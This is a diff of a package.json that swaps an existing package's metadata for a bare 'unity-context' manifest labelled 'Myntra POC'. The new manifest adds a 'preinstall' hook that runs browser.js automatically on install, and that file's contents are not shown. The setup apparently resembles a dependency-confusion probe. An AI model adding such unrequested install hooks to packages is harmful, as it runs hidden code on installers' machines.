@@ -1,63 +1,12 @@
 {
-  "name": "shinkansen-signals",
-  "version": "1.1.16",
-  "description": "Shinkansen Signals",
-  "keywords": [
-    "Shinkansen",
-    "Signals",
-    "Zashiki Karakuri",
-    "Zashiki",
-    "Karakuri"
-  ],
-  "main": "./src/index.cjs",
-  "type": "module",
-  "author": "Jonathan Perry for Modern Poacher Limited <modernpoacher@modernpoacher.com>",
-  "license": "MIT",
-  "engines": {
-    "node": ">=18.5.0"
-  },
-  "repository": {
-    "type": "git",
-    "url": "git@github.com/modernpoacher/shinkansen-signals.git"
-  },
+  "name": "unity-context",
+  "version": "3.0.13",
+  "description": "Myntra POC",
+  "main": "index.js",
   "scripts": {
-    "prelint": "npm run nvm",
-    "lint": "eslint . --ext .mjs --ext .cjs",
-    "lint:fix": "npm run lint -- --fix",
-    "pretest": "npm run nvm",
-    "test": "cross-env NODE_ENV=test mocha test --recursive",
-    "nvm": "bash nvm.sh",
-    "prepare": "husky install"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node browser.js"
   },
-  "dependencies": {
-    "debug": "^4.3.4"
-  },
-  "devDependencies": {
-    "@babel/core": "^7.21.8",
-    "@babel/eslint-parser": "^7.21.8",
-    "@babel/plugin-proposal-export-default-from": "^7.18.10",
-    "@babel/preset-env": "^7.21.5",
-    "@babel/register": "^7.21.0",
-    "@modernpoacher/hooks": "^1.0.397",
-    "babel-plugin-module-resolver": "^5.0.0",
-    "chai": "^4.3.7",
-    "core-js": "^3.30.2",
-    "cross-env": "^7.0.3",
-    "eslint": "^8.40.0",
-    "eslint-config-standard": "^17.0.0",
-    "eslint-import-resolver-babel-module": "^5.3.2",
-    "eslint-plugin-import": "^2.27.5",
-    "eslint-plugin-node": "^11.1.0",
-    "eslint-plugin-promise": "^6.1.1",
-    "husky": "^8.0.3",
-    "mocha": "^10.2.0",
-    "rimraf": "^5.0.0"
-  },
-  "exports": {
-    ".": {
-      "require": "./src/index.cjs",
-      "import": "./src/index.mjs"
-    },
-    "./signals": "./src/signals/index.mjs"
-  }
+  "author": "",
+  "license": "ISC"
 }
